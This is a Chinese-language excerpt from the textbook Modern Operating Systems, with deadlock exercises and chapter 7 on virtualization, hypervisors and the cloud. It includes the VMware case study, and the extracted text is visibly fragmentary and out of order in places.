23.重新考虑上一题，假设现在共有p 个进程，每 个进程最多需要m个资源，并且有r 个资源可用。
什么样的条件可以保证死锁不会发生?
24. 假设图6-12中的进程A请求最后一台磁带机， 这一操作会引起死锁吗?
25. 银行家算法在一个有m个资源类型和n个进程 的系统中运行。
当m 和n都很大时，为检查状 态是否安全而进行的操作次数正比于m²n 。
a 和b的值是多少?
26.一个系统有4个进程和5个可分配资源，当前分 配和最大需求如下：
使用6.4.2节中描述的死锁检测算法来说明该系 统中存在一个死锁。
并识别在死锁中的进程。
15.解释系统是如何从前面问题的死锁中恢复的， 使用：(a) 抢 占 ；(b) 回 滚 ；(c) 终止进程。
16. 假设在图6-6中，对某个i, 有C,+R>E, 这 意味着什么?
17.图6-8中的所有轨道都是水平的或者垂直的。
你能否设想一种情况，使得同样存在斜轨迹的 可能?
18.图6-8所示的资源轨迹模式是否可用来说明三 个进程和三个资源的死锁问题?
如果可以，它 是怎样说明的?
如果不可以，请解释为什么。
19.理论上，资源轨迹图可以用于避免死锁。
通过合 理的调度，操作系统可避免进入不安全区域。
请
若保持该状态是安全状态，x的最小值是多少?
27.一个消除环路等待的方法是用规则约定一个进 程在任意时刻只能得到一个资源。
举例说明在 很多情况下这个限制是不可接受的。
28. 两个进程A和B, 每个进程都需要数据库中的3 个记录1、2、3。
如果A和B都以1、2、3的次 序请求，将不会发生死锁。
但是如果B以3、2、 1的次序请求，那么死锁就有可能会发生。
对 于这3种资源，每个进程共有3!
(即6)种次序 请求，这些组合中有多大的可能可以保证不会 发生死锁?
29.一个使用信箱的分布式系统有两条IPC 原语： send 和receive 。
receive 原语用于指定从哪个 进程接收消息，并且如果指定的进程没有可用 消息，即使其他进程正在写消息，该进程也等 待。
进程不存在共享资源，但是由于其他原因， 进程需要经常通信。
死锁有可能产生吗?
请讨 论这一问题。
30.在一个电子资金转账系统中，有很多相同进程
按如下方式工作：每个进程读取一行输入，该 输入给出一定数目的款项、贷方账户、借方账 户。
然后该进程锁定两个账户，传送这笔钱， 完成后释放锁。
由于很多进程并行运行，所以 存在这样的危险：锁定x会无法锁定y, 因 为y 已被一个正在等待x的进程锁定。
设计一个方 案来避免死锁。
保证在没有完成事务处理前不 要释放该账户记录。
(换句话说，在锁定一个 账户时，如果发现另一个账户不能被锁定就立 即释放这个已锁定的账户。
)
31.一种预防死锁的方法是去除占有和等待条件。
在本书中，假设在请求一个新的资源以前，进 程必须释放所有它已经占有的资源(假设这是 可能的)。
然而，这种做法会引入这样的危险 性：竞争的进程得到了新的资源但却丢失了原 有的资源。
请给出这一方法的改进。
32计算机系学生想到了下面这个消除死锁的方 法。
当某一进程请求一个资源时，规定一个时 间限制。
如果进程由于得不到需要的资源而被 阻塞，定时器就会开始运行。
当超过时间限制 后，进程会被释放掉，并且允许该进程重新运 行。
如果你是教授，你会给这样的学生多少 分?
为什么?
33.内存单元被交换区和虚拟内存系统抢占。
处理 器在分时环境中被抢占。
你认为这些抢占方法 是为了处理资源死锁还是有其他的目的?
它们 的开销有多大?
34.解释死锁、活锁和饥饿的区别。
35.假设两个进程发出查找命令来改变访问磁盘的 机制并启用读命令。
每个进程在执行读命令之 前被中断，并且发现另外一个进程已经移动了 磁盘。
它们都重新发出查找命令，但是又同时 被对方中断。
这个序列不断地重复。
这是一个 资源死锁还是活锁?
你推荐用什么方法来解决 这个异常?
36. 局域网使用一种叫作CSMA/CD 的媒体访问方 法。
在这个方法中，站点之间共享一条总线， 并且能够感知传输媒介以及检测传输和冲突。
在以太网协议中，站点请求共享通道时如果感 知到传输通道是忙碌的，那么它们不会传输帧。
当传输结束的时候，等待的站点会继续传输帧。
同时传输两个帧会产生冲突。
如果站点在检测 到冲突之后立即重复传输这些帧，则又会连续 地产生冲突。
(a) 这是一个资源死锁还是活锁?
(b) 你能否为这种异常提出一个解决方法?
(c) 这种情况下会产生饥饿么?
37.一个程序在合作和竞争机制的顺序上存在着错 误，导致消费者进程在阻塞空缓冲区之前就锁 定了互斥量(互斥信号量)。
生产者进程在能 够将数据放在空缓冲区上以及唤醒消费者进程 之前被阻塞在互斥量上。
因此，生产者进程和 消费者进程都被一直阻塞，生产者进程等待互 斥量被解锁，消费者进程等待生产者进程发出 的信号。
这是一个资源死锁还是通信死锁?
请 提出一种方法来解决进程之间的控制问题。
38.Cinderella 和Prince 要离婚，为分割财产，他 们商定了以下算法。
每天早晨每个人发函给 对方律师要求财产中的一项。
由于邮递信件 需要一天的时间，他们商定如果发现在同一 天两人请求了同一项财产，第二天他们会发 信取消这一要求。
他们的财产包括狗Woofer、 Woofer 的狗屋、金丝雀Tweeter 和Tweeter 的 鸟笼。
由于这些动物喜爱它们的房屋，所以 又商定任何将动物和它们房屋分开的方案都 无效，且整个分配从头开始。
Cinderella 和 Prince 都非常想要Woofer 。
于是他们分别去度 假，并且每人都编写程序用一台个人计算机 处理这一谈判工作。
当他们度假回来时，发 现计算机仍在谈判，为什么?
产生死锁了 吗?
产生饥饿了吗?
请讨论。
40.重复上一个习题，但此次要避免饥饿。
当一只 想向东去的狒狒来到绳索跟前，但它发现有别 的狒狒正在向西越过峡谷时，它会一直等到绳 索可用为止。
但在至少有一只狒狒向东越过峡 谷之前，不允许再有狒狒开始从东向西越过峡 谷。
判断这一请求是否安全。
请把有关请求和相应 决定的列表输出到一个文件中。
42.写一个程序实现每种类型多个资源的死锁检测 算法。
你的程序应该从一个文件中读取下面的 输入：进程数、资源类型数、每种存在类型的 资源数(向量E) 、 当前分配矩阵C (第一行， 接着第二行，以此类推)、需求矩阵R(第一行， 接着第二行，以此类推)。
你的程序输出应表 明在此系统中是否有死锁。
如果系统中有死锁， 程序应该打印出所有死锁的进程ID。
43.写一个程序使用资源分配图检测系统中是否存 在死锁。
你的程序应该从一个文件中读取下面
的输入：进程数和资源数。
对每个进程，你应 该读取4个数：进程当前持有的资源数、它持 有的资源的ID 、它当前请求的资源数、它请求 的资源ID。
程序的输出应表明在此系统中是否 有死锁。
如果系统中有死锁，程序应该打印出 所有死锁的进程ID。
44.在某些国家，当两人相遇的时候会互相鞠躬。
这项礼仪通常是两人中的一人首先鞠躬，并保 持姿势以等待另一人鞠躬。
如果两人同时鞠躬， 那么他们都会永远保持鞠躬的状态。
请写一个 程序，保证不会产生死锁。
华 所 意
蔽
第7章
Modern Operating Systems,Fourth Edition
虚拟化和云
镜像，就能完成整个操作系统的迁移。
虚拟机的另一个用途是在已停止支持或无法工作于当前硬件的操作系统(或操作系统版本)上运行 遗留应用程序。
遗留应用程序可以与当前应用程序同时运行在相同硬件上。
事实上，能同时运行不同操 作系统中的应用程序是虚拟机受欢迎的重要理由。
7.1 历史
伴随着近年来围绕虚拟化的大肆宣传，人们有时会忘记相对于互联网的出现，虚拟机是相当古老的 技术。
早在20世纪60年代，IBM 就试验了两个独立开发的虚拟机管理程序SIMMON 和CP-40 。
虽然CP- 40只是一个研究项目，但它被重新实现为CP-67, 构成了CP/CMS 的控制程序。
CP/CMS 是IBM System/360 Model 67的虚拟机操作系统。
1972年，它又被重新实现为VM/370, 用在System/370 系列上。
IBM 在20世纪90年代将System/370 产品线替换为System/390。
这些更新基本上只有名字发生了变化，底 层体系结构出于向后兼容性的原因保持不变。
当然，硬件技术的改进使得新机器比老机器更大更快了。
但就虚拟化而言，没有任何改变。
2000年，IBM 发布了z 系列，支持64位地址空间，但仍向后兼容 System/360 。
在x86上的虚拟化技术流行起来的几十年前，这些系统就开始支持虚拟化技术了。
Parallels等。
看起来此时才是推广虚拟化技术的合适时机，虽然理论早在1974年就明确了，IBM 也已销 售了支持并广泛使用虚拟化技术的计算机长达几十年之久。
尽管1999年虚拟化技术突然间受到了广泛关 注，然而它并不是一项新技术。
7.2 虚拟化的必要条件
对于虚拟机来讲，非常重要的一点是要像真实的机器那样运转。
例如，虚拟机要能像真实的机器那 样启动，支持安装任意操作系统。
虚拟机管理程序的任务就是提供这种幻象，并高效地实现。
虚拟机管
理程序需要在以下三个维度上有良好的表现：
1) 安全性：虚拟机管理程序应完全掌控虚拟资源。
2) 保真性：程序在虚拟机上执行的行为应与在裸机上相同。
3) 高效性：虚拟机中运行的大部分代码应不受虚拟机管理程序的干涉。
下面来讨论保真性。
虚拟化在x86 体系结构上长期以来一直是个问题，因为Intel 386体系结构中的 缺陷以向后兼容的名义在新CPU 中延续了20年。
简而言之，每个包含内核态和用户态的CPU 都有一个特 殊的指令集合，其中的指令在内核态和用户态执行的行为不同。
这些指令包括进行I/O操作和修改MMU
设置的指令，Popek 和Goldberg 称之为敏感指令 (sensitive instruction)。
还有另一个指令集合，其中的指 令在用户态执行时会导致陷入，Popek 和Goldberg 称之为特权指令 (privileged instruction)。
他们的论文 首次指出机器可虚拟化的一个必要条件是敏感指令为特权指令的子集。
简单来说，如果用户态想要做不 应该在用户态做的事情，硬件必须陷入。
IBM/370 有这一特性而Intel 386没有。
很多Intel 386敏感指令在 用户态执行时具有不同的行为或者直接被忽略。
例如，POPF 指令替换标志寄存器，会修改中断启用/禁 用位。
在用户态，这一位不会被修改。
因此，386及其后继者不能被虚拟化，也不能直接支持虚拟机管 理程序 。
实际情况比上面描述的更严重。
除了敏感指令在用户态未能陷入的问题外，还存在可以在用户态读 取敏感状态而不造成陷入的指令(这类指令在内核态和用户态执行的行为相同，因而不属于敏感指令)。
例如，在2005年之前的x86处理器上，程序可以通过读取代码段选择符判断自身运行在用户态还是内核 态。
在虚拟机中，操作系统若这样做并发现自己运行在用户态，就会做出错误的决策。
从2005年起，Intel 和AMD 开始在CPU 中引入虚拟化支持，使得这个问题最终得到解决 (Uhlig,
7.3 第一类和第二类虚拟机管理程序
Goldberg(1972) 区分了两类虚拟化方法。
图7-1a 展示了第一类虚拟机管理程序。
从技术上讲，第 一类虚拟机管理程序就像一个操作系统，因为它是唯一一个运行在最高特权级的程序。
它的工作是支持 真实硬件的多个虚拟机 (virtual machine) 拷贝，类似于普通操作系统支持的进程。
Excel Word Mplayer Emacs
控制域
Linux
第一类虚拟机管理程序
硬 件(CPU 、 磁盘、 网络、中断等)
a)
b)
图7-1 两类虚拟机管理程序在系统中的位置
图7-1b展示的第二类虚拟机管理程序则不同。
它是一个依赖于Windows、Linux 等操作系统分配和 调度资源的程序，很像一个普通的进程。
当然，第二类虚拟机管理程序仍伪装成具有CPU和各种设备的 完整计算机。
两类虚拟机管理程序都必须以一种安全的方式执行机器指令。
例如，运行在虚拟机管理程 序上的一个操作系统可能修改甚至弄乱自己的页表，但不能影响其他虚拟机操作系统。
第二类虚拟机管理程序有时又称作托管型虚拟机管理程序，依赖Windows、Linux、OS X等宿主操 作系统提供的大量功能。
首次启动时，第二类虚拟机管理程序像一个刚启动的计算机那样运转，期望找 到一个包含操作系统的DVD 、U盘或CD-ROM 。
这些驱动器可以是虚拟设备，例如，可以将包含操作系 统的镜像保存为宿主机硬盘上的ISO文件，让虚拟机管理程序伪装成从正常DVD驱动器中读取。
接下来， 虚拟机管理程序运行DVD上的安装程序，将操作系统安装到虚拟磁盘 (virtual disk,其实只是宿主操作
图7-2总结了目前为止讨论过的虚拟化技术类别，包括第一类和第二类虚拟机管理程序，并举例说 明了每种技术类别和虚拟机管理程序的组合。
7.4 高效虚拟化技术
本节将详细研究可虚拟化与性能这两个重要问题。
假设目前有一个支持一台虚拟机的第一类虚拟机 管理程序，如图7-3所示。
与其他第一类虚拟机管理程序一样，它也运行在裸机上。
虚拟机作为用户态 的一个进程运行，不允许执行(Popek-Goldberg 意义上的)敏感指令。
然而，虚拟机上的操作系统认为 自己运行在内核态(实际上不是)。
我们称之为虚拟内核态(virtual kernel mode)。
虚拟机中也运行用户 进程，这些用户进程认为自己运行在用户态(实际上确实是的)。
图7-3 当虚拟机中的操作系统执行了一个内核指令时，如果支持虚拟化技术，那么它会陷入虚拟机管理程序
7.4.1 在不支持虚拟化的平台上实现虚拟化
在支持VT的平台上构建虚拟机系统相对直接一些，在VT出现之前人们是怎么实现虚拟化的?
例如， VMware 在x86 虚拟化扩展到来前就发布了虚拟机管理程序。
答案是软件工程师们利用二进制翻译和x86 平台确实存在的硬件特性(如处理器的 特权级)构建出了虚拟机系统。
用户进程
一个基本块执行完毕后，控制流返回虚拟机管理程序，以定位下一个基本块。
如果下一个基本块已 经翻译过，就能立即执行。
否则，下一个基本块将被翻译、缓存、执行。
最终，程序的绝大部分都将在 缓存里，程序能以接近满速运行。
此过程中会用到各种优化，例如，如果一个基本块以跳转到(或调用) 另一个基本块结尾，则结尾的指令可以替换成直接跳转到(或调用)翻译过的基本块，从而消除与查找 后继块相关联的所有开销。
再次强调，用户程序中的敏感指令无需替换，硬件会处理好。
目前为止我们描述了第一类虚拟机管理程序。
虽然第二类虚拟机管理程序在概念上与第一类不同， 但是它们在很大程度上使用了相同的技术。
例如，VMware ESX Server(2001年发布的第一类虚拟机管 理程序)使用了与VMware Workstation(1999年发布的第二类虚拟机管理程序)完全相同的二进制翻译 技术。
类似地，虚拟机管理程序还需要正确地处理中断，例如磁盘发出的中断或缺页异常。
如果虚拟机管 理程序要使用陷入并模拟的方式处理中断，同样需要能接收陷入，而用户进程不可能在内核中安装陷入 /中断处理程序。
因此，大多数现代的第二类虚拟机管理程序有一个在第0级运行的内核模块，能够使用特权指令操
7.4.2 虚拟化的开销
人们可能会天真地期望支持VT的CPU 在虚拟化上比软件翻译方法性能更好，但实验结果显示两者 各有优劣(Adams 和Agesen,2006) 。
VT 硬件使用的陷入并模拟方法会产生大量陷入，而陷入在现代硬 件上开销很大，因为CPU高速缓存、TLB 、转移预测都会受到不利影响。
当敏感指令被替换为(宿主机 进程内部)对虚拟机管理程序例程的调用后，就不用承担这些上下文切换的开销。
按Adams和Agesen的 实验所示，根据工作负载的不同，软件方法有时优于硬件方法。
基于这一原因，某些第一类(和第二类) 虚拟机管理程序为了性能而进行二进制翻译，虽然无须二进制翻译虚拟机也能正确运行。
7.5 虚拟机管理程序是正确的微内核吗
于是，有些研究人员认为应将虚拟机管理程序看作“正确的微内核”(Hand 等人，2005)。
首先要 指出的是这是一个充满争议的话题，一些研究人员反对这种看法，认为两者之间没有足以使虚拟机管理 程序成为“正确的微内核”的本质差别。
另一些研究人员认为与微内核相比，虚拟机管理程序并不太适 用于构建安全的系统，他们提出虚拟机管理程序应扩展消息传递、内存共享等内核功能(Hohmuth 等人，
2004)。
还有一些研究人员认为虚拟机管理程序甚至不是“正确完成的操作系统研究”(Roscoe 等人， 2007)。
由于还没有人评论操作系统教材“正确”与否，所以不妨深入探讨一下虚拟机管理程序与微内 核的相似之处。
图7-5 虚拟化与半虚拟化
Amsden等人于2006年提出了一个解决方案。
在他们的模型中，只要内核需要执行敏感操作，就调 用特殊的例程。
这些例程称作虚拟机接口 (Virtual Machine Interface,VMI),组成了硬件及虚拟机管理 程序的底层接口。
这些例程在设计上保持通用性，未绑定特定硬件平台或虚拟机管理程序。
研究人员也提出了其他的虚拟机接口方案 。
半虚拟化操作 (paravirt op)是比较流行的一个方案。
此方案的思想在概念上与前面描述的相似，但细节有所不同。
IBM 、VMware 、Xen和Red Hat等Linux厂 商提倡使用一个与虚拟机管理程序无关的接口，该接口从2.6.23版起包含在主线Linux内核中，让内核能 与任意虚拟机管理程序(或裸机)交流。
a) b) c)
图7-6 运行在裸机 (a) 、VMware(b) 和Xen(c) 上的VMI Linux
7.6 内存虚拟化
目前为止，我们介绍了CPU 虚拟化的问题。
但一个计算机系统不只由CPU 构成，内存和I/O 设备也 需要虚拟化。
让我们来看看实现方式。
虚拟机管理程序如何处理?
一种解决方案是确实将物理页10、11、12分配给这个虚拟机，并设置实 际的页表将虚拟页7、4、3映射过来。
这样做到目前为止还没有问题。
为不会发生缺页异常。
从页表中删除映射后需要执行INVLPG指令(真实意图是使TLB项失效),虚拟机 管理程序可以截获此敏感指令并删除影子页表中的对应项。
同样，这种做法不够优雅但是可行。
1.嵌套页表的硬件支持
即使没有虚拟化，操作系统仍然维护虚拟页与物理页之间的映射。
硬件在这些页表查找虚拟地址对
2. 回收内存
运行在相同物理硬件上的所有虚拟机都有自己的物理内存页，并认为自己支配着整个机器。
这种设 计非常好，但内存需要回收时就会发生问题，特别是与内存过量使用 (overcommitment) 功能结合时。
内存过量使用是指虚拟机管理程序向所有虚拟机提供的物理内存总量会超过系统中实际的物理内存大 小。
一般而言，这个想法很好，虚拟机管理程序可以同时创建更多配置更高的虚拟机。
例如， 一台机器 有32GB物理内存，可以运行三台各16GB内存的虚拟机。
从数值上来看显然是不匹配的。
然而，三台虚 拟机可能并不会同时用到物理内存的上限，或者可能共享一些具有相同内容的页面(例如Linux 内核), 这时便可使用去重 (deduplication) 优化技术。
在这种情况下，三台虚拟机使用的物理内存总量小于 16GB的三倍。
去重技术后面再作讨论。
目前关注的问题是随着工作负载的变化，之前合理的虚拟机物 理内存分配可能变得不再合适。
也许虚拟机1需要更多内存而虚拟机2需求少一些，这样虚拟机管理程序 就需要将内存资源从一台虚拟机转移到另一台，以使系统整体受益。
问题是，怎样安全地回收已分配给 一台虚拟机的物理内存页?
7.7 I/O虚拟化
关于I/O的另一个有趣的想法是虚拟机管理程序可以扮演虚拟交换机的角色。
每个虚拟机都有一个 MAC地址，虚拟机管理程序像以太网交换机一样在不同虚拟机之间交换帧。
虚拟交换机有几个优势，
如便于重新配置、容易进行功能增强(如安全性扩展)等。
1.I/O MMU
I/O 模拟中另一个需要考虑的是DMA使用绝对内存地址的问题。
人们可能希望虚拟机管理程序在 DMA开始前介入并重新映射地址，然而硬件上已经有了I/O MMU,可以像MMU虚拟化内存那样虚拟化 I/O 。
I/O MMU有不同的形式，适用于不同处理器体系结构。
即使只看x86,Intel 和AMD采用的技术也 有细微差别。
当然，技术背后的思想是相同的。
I/O MMU这一硬件功能消除了虚拟化中的DMA问题。
像普通MMU 一 样 ，I/O MMU用页表将设备想要使用的内存地址(设备地址)映射到物理地址。
在 虚拟环境中，虚拟机管理程序可以设置页表以避免设备进行DMA时影响到当前虚拟机之外的内存。
设备隔离 (device isolation) 保证设备可以直接访问其分配到的虚拟机的内存空间而不影响其他虚 拟机的完整性。
也就是说I/O MMU能防止错误的DMA 通信，就像普通MMU能防止进程的错误内存访问 一样，两者在访问未映射页面时都会导致缺页异常。
除了DMA和设备地址，I/O 虚拟化还需要处理中断，使设备产生的中断以正确的中断号抵达正确的 虚拟机。
因此，现代I/O MMU还支持中断重映射 (interrupt remapping)。
比如一个设备发送了中断号为 1的消息，消息首先抵达I/O MMU,通过中断重映射表转换为一个新的中断，目标是正在运行指定虚拟 机的CPU, 中断向量号是该虚拟机想要的(例如66)。
I/O MMU还能帮助32位设备访问4GB以上的物理内存。
通常，32位设备不能访问(如通过DMA) 4GB 以上的地址，但I/O MMU可以将32位的设备地址映射到更大的物理地址空间中。
2.设备域
3. 单 根I/O 虚拟化
直接将一个设备分配给一个虚拟机的可伸缩性不好。
这种方式下，如果只有4块物理网卡，则只能 支持最多4个虚拟机。
要支持8个虚拟机就需要8块网卡。
如果需要运行128个虚拟机，那么物理机就会被 网线淹没。
单根I/O 虚拟化 (Single Root I/O Virtualization,SR-IOV) 允许驱动程序与设备间绕过虚拟机管理 程序进行通信。
支持SR-IOV 的设备能为每个使用该设备的虚拟机提供独立的地址空间、中断和DMA 流 (Intel,2011) 。
此设备看起来就像多个独立的设备，分别分配到不同的虚拟机。
例如，每个虚拟设备都
有独立的基址寄存器和地址空间。
虚拟机将分配给它的虚拟设备的地址空间映射到自己的地址空间中。
7.8 虚拟装置
虚拟机能够解决一个困扰用户已久的问题：如何安装新的应用程序。
解决这一问题对开源软件的用 户尤为重要。
许多应用程序依赖大量其他应用程序和运行库，这些应用程序和运行库又会引入更多的依 赖软件包。
此外，还可能有对特定版本的编译器、脚本语言、操作系统的依赖。
7.9 多核CPU上的虚拟机
虚拟机与多核CPU的结合创造了一个可用CPU 数量能由软件设置的新世界。
如果有4个CPU 核心， 每个核心最多可以运行8个虚拟机，则单个CPU可配置成32节点的多计算机系统。
根据软件不同也可以 配置成较少的CPU(节点)数。
应用程序设计人员可以首先选择需要的CPU数量再进行设计，这一前所 未有的进步开启了计算机技术的新阶段。
如果虚拟机能共享内存，单个计算机就能成为虚拟的多处理器系统。
由于多核芯片上的所有核心共 享相同的RAM, 因此单一的四核芯片根据需要可以很容易地配置成32节点多处理器或多计算机系统。
7.10 授权问题
如果企业具有允许在n台机器上同时运行软件的授权，问题就会变得更糟糕，尤其是虚拟机可以随 时按需启动或停止。
7.11 云
提到云，很少有人理解其确切含义。
美国国家标准与技术研究院 (National Institute of Standards and Technology) 列出了云的五条必要特征：
2)普适的网络访问。
所有资源都可以通过网络用标准化的机制访问，以支持各种异构设备。
4)快速可伸缩。
能根据用户需求弹性甚至是自动地获取和释放资源。
云能改变企业进行计算的方式。
总体来说，将计算资源集中到少数几个地方(靠近便宜的能源和方 便的冷却手段)可以实现规模经济效益。
将计算处理工作外包意味着不用再过于关心IT 基础设施的管理、 备份、维护、折旧、伸缩性、可靠性、性能甚至安全性。
所有这些工作都集中在一处完成，假设云提供 商是称职的，则这些都能很好地完成。
可以想象，IT 经理们比十年前要轻松得多。
然而，解决了这些问 题，新的问题又出现了：你真的能信任云提供商，让他们保管敏感数据吗?
运行在同一基础设施上的竞 争者能推断出你的私有信息吗?
你的数据适用什么法律(例如，如果云提供商来自美国，你的数据是否 适用美国爱国者法案，即使你的公司在欧洲)?
一旦你将所有数据保存在云X上，你能否将数据全部取 回?
如果不能，你就被拴在了云X及其提供商上，这一现象称作供应商锁定 (vendor lock-in)。
7.11.2 虚拟机迁移
虚拟化技术不仅允许IAAS云在同一硬件上同时运行多个不同操作系统，还支持智能的管理机制。
我们已经介绍了虚拟化技术的资源过量使用的能力以及与之相结合的去重技术。
现在我们看看另一个管 理问题：如果一台机器需要检修(甚至更换)时却运行着很多重要的虚拟机，怎么办?
如果因为云提供 商想要更换硬盘而导致系统停机，用户很可能会有意见。
虚拟机管理程序将虚拟机与物理硬件解耦。
也就是说，虚拟机运行在哪台机器上并不重要。
因此， 在一台机器需要检修时，管理员可以简单地关闭所有虚拟机并在另一台机器上重新启动它们。
然而，这 样做会带来显著的停机时间。
挑战在于不关闭虚拟机就将其从需要检修的硬件迁移到新的机器上。
一个小的改进是迁移时暂停而非关闭虚拟机。
在暂停过程中，将虚拟机使用的内存页尽快复制到新 机器上，在新的虚拟机管理程序上配置好并恢复执行。
除了内存之外，还需要迁移存储和网络连接，如 果物理机器距离较近，则迁移过程也会相对较快。
首先可以使用基于网络的文件系统，以使虚拟机运行
在哪个机架上变得无关紧要。
类似地，IP 地址可以简单地转换到新位置。
不过，仍然需要将虚拟机暂停 一段时间，可能比关机迁移时间短一些，但还是比较耗时的。
7.11.3 检查点
虚拟机与物理硬件的解耦还有其他优势，尤其是可以暂停一个虚拟机，这很有用。
如果暂停的虚拟 机的状态(例如CPU 状态、内存页、存储状态)保存在磁盘上，就成为运行中的虚拟机的快照。
当软件 导致运行中的虚拟机崩溃时，就可以回滚到快照保存的状态，若无其事地继续运行。
保存快照的最直接方式是复制所有状态，包括完整的文件系统。
然而，即使磁盘速度很快，复制上 TB的磁盘内容也会花点时间。
和前面的虚拟机迁移相同，我们不想暂停太久。
解决方案是使用写时复 制技术，数据只有在绝对必需时才进行复制。
快照相当好用，但还有些问题。
如果虚拟机正在与远程机器交互怎么办?
可以保存系统快照并稍后 重新启动，但通信连接早就断开了。
显然，这是一个无法解决的问题。
7.12 案例研究：VMware
在此案例研究中，首先介绍VMware公司的起源历史。
然后介绍VMware Workstation,这是一个第 二类虚拟机管理程序，也是该公司的首个产品。
我们将介绍它的设计挑战和解决方案中的要素，以及 VMware Workstation的演变历程。
最后，介绍VMware的第一类虚拟机管理程序ESX Server。
7.12.1 VMware的早期历史
使用虚拟机的想法在20世纪60年代和70年代的计算机工业界和学术研究中很热门，但80年代个人计 算机兴起之后人们就失去了对虚拟化的兴趣。
只有IBM 的大型机部门还关心虚拟化。
那时的计算机体系 结构，特别是Intel的×86体系结构不支持虚拟化(即不符合Popek-Goldberg 准则)。
这相当令人遗憾，因 为386处理器是在Popek-Goldberg 论文发表十年后设计的，设计者当时应对虚拟化有更深了解。
1997年，未来VMware的三位创建者在斯坦福大学构建了一个原型虚拟机管理程序Disco(Bugnion
为 此 ，VMware公司1998年成立，目标是将虚拟化引入x86 体系结构和个人计算机工业。
VMware的 首个产品(VMware Workstation) 是32位x86 平台上的第一个虚拟化解决方案。
该产品发布于1999年， 有两个版本：运行在Linux宿主操作系统上的第二类虚拟机管理程序VMware Workstation for Linux, 运行在Windows NT宿主操作系统上的第二类虚拟机管理程序VMware Workstation for Windows。
两个 版本功能相同，用户可以创建虚拟机，指定虚拟硬件配置(例如内存大小、虚拟磁盘大小),选择操作 系统并(从虚拟CD-ROM) 安装到虚拟机。
VMware Workstation主要针对开发者和IT专家。
在引入虚拟化之前，开发者桌上通常有两台计算机： 一台用于开发，系统稳定，另一台在需要时可以重装系统以进行测试。
有了虚拟化之后，第二台计算机
可以使用虚拟机代替。
7.12.2 VMware Workstation
VMware Workstation是32位x86 计算机的首个虚拟化产品。
ACM 于2009年向VMware Workstation 1.0 for Linux的作者颁发了ACM 软件系统奖 (ACM Software System Award),此次对虚拟化的认可在计 算机工业界和学术界都有深远影响。
一篇论文 (Bugnion 等人，2012)描述了最初版本VMware Workstation中的技术细节，下面概要介绍论文内容。
最初的想法是，虚拟化层在由x86 CPU构建并主要运行Microsoft Windows操作系统的商业平台(即 WinTel平台)上可能会有用。
虚拟化的优势可以帮助解决一些WinTel平台已知的缺陷，例如应用程序互 操作性、操作系统迁移、可靠性和安全性。
另外，虚拟化还允许其他操作系统共存，特别是Linux。
虽然在大型机上虚拟化技术的研究和商业开发已有几十年历史，但是x86 平台有很大的不同，需要 采用新的方法。
例如，大型机是垂直整合的 (vertically integrated),单一生产商设计制造硬件、虚拟机 管理程序、操作系统和大多数应用程序。
接下来讨论构建VMware Workstation的技术挑战。
7.12.3 将虚拟化引入x86的挑战
1)兼容性。
虚拟机提供本质上与物理机相同的环境，这意味着任何x86操作系统和所有应用程序都 能无需修改就能运行在虚拟机上。
虚拟机管理程序需要在硬件层面提供足够的兼容性，以使用户能不受 限制地运行任意(版本的)操作系统。
2)性能。
虚拟机管理程序的性能开销要足够低，以使用户能将虚拟机作为主要工作环境。
以此为目 标 ，VMware 的设计者们希望能以接近本地执行的速度运行相关的工作负载。
在最坏的情况下，虚拟机 运行于最新一代处理器上的性能要与前一代处理器的本地性能相同。
这是基于“大多数x86软件不会设 计成只能运行在最新一代处理器上”的观察经验。
1) ×86体系结构不可虚拟化。
其中包含虚拟化敏感的非特权指令，违背了Popek-Goldberg 的严格虚 拟化准则。
例如，POPF 指令根据当前运行的软件是否被允许关中断而具有不同(且不会陷入)的语义。
这个特点排除了传统的陷入并模拟的虚拟化方法。
甚至Intel公司的工程师们都确信自己的处理器在实际 意义上不可虚拟化。
2)×86体系结构的高度复杂性。
它是一个众所周知相当复杂的CISC 体系结构，包含了几十年的向后 兼容性支持。
这些年来，x86 一共引入了四个主要的运行模式(实模式、保护模式、虚拟8086模式和系 统管理模式),每种模式具有不同的硬件分段寻址模型、分页机制、特权级别设置和安全特征(例如调 用门)。
3)×86机器具有多种周边设备。
虽然只有两个主要的x86处理器生产商，但是个人计算机可能包含 许多种类的扩展卡和设备，每个都有自己的驱动程序。
虚拟化所有这些周边设备是不可行的，无论前端 (虚拟机中的虚拟硬件)还是后端(虚拟机管理程序需要控制的真实硬件)。
4)需要有简单的用户体验。
以前的经典虚拟机管理程序是在工厂中安装好的，类似于今天计算机中 的固件程序。
由于VMware刚起步，因此用户需要在现有的硬件上进行安装。
VMware 需要一种具有简单 安装体验的软件交付模型，以利于推广。
7.12.4 VMware Workstation解决方案概览
本节将在一个较高的层面上描述VMware Workstation如何应对前面提到的挑战。
VMware Workstation是一个包含了多个模块的第二类虚拟机管理程序。
一个重要模块是VMM, 负 责执行虚拟机的指令。
另一个重要模块是VMX, 负责与宿主操作系统交互。
本节首先介绍VMM如何解决x86体系结构不可虚拟化的问题。
然后描述设计者们在整个开发过程中 使用的以操作系统为中心的策略。
接下来描述虚拟硬件平台的设计，解决了外围设备多样性带来的一部 分挑战。
最后，讨论宿主操作系统在VMware Workstation中的角色，特别是VMM和VMX模块的交互。
1.虚拟化x86 体系结构
另一个办法是采用完全模拟的方式，VMM 模拟(而不是直接在硬件上)执行虚拟机的指令。
这种 方式可以做到相当高效，SimOS(Rosenblum 等人，1997)仿真器上的经验表明使用动态二进制翻译技 术运行用户程序可以将完全模拟的性能开销降至1/5。
虽然这确实高效，在仿真用途上也很有价值，但 是1/5的性能降低对VMware而言还不够，不能满足期望的性能要求。
这一问题的解决方案包含了两个关键点。
首先，陷入并模拟式的直接执行虽然不能用来虚拟化整个 x86体系结构，但在某些时候确实可用于x86虚拟化，例如执行用户态程序的时间，这占了相关工作负载 的大多数执行时间。
这是因为这些虚拟化敏感指令并不总是敏感的，它们只在特定情况下是敏感的。
例 如，当软件可以关中断(如运行操作系统)时POPF 指令才是虚拟化敏感的，否则(运行几乎所有用户 程序时)就不是。
图7-8展示了原始VMware VMM的模块化组成部分。
可以看到，它包含直接执行子系统、二进制翻
译子系统和用于判断使用哪个子系统的决策算法。
两个子系统都依赖于某些共享模块，例如通过影子页 表虚拟化内存的模块和模拟I/O设备的模块。
图7-8 VMware虚拟机管理程序构件图
优先考虑直接执行子系统，不能直接执行时，动态二进制翻译子系统提供了回退机制。
每当虚拟机 可能发出虚拟化敏感指令时，就会出现回退的情况。
因此，每个子系统不断地重新执行决策算法以确定 子系统切换是否可行(从二进制翻译到直接执行)或必要(从直接执行到二进制翻译)。
决策算法有一 些输入参数，如虚拟机当前所处的特权级、当前是否可以开中断、段的内容等。
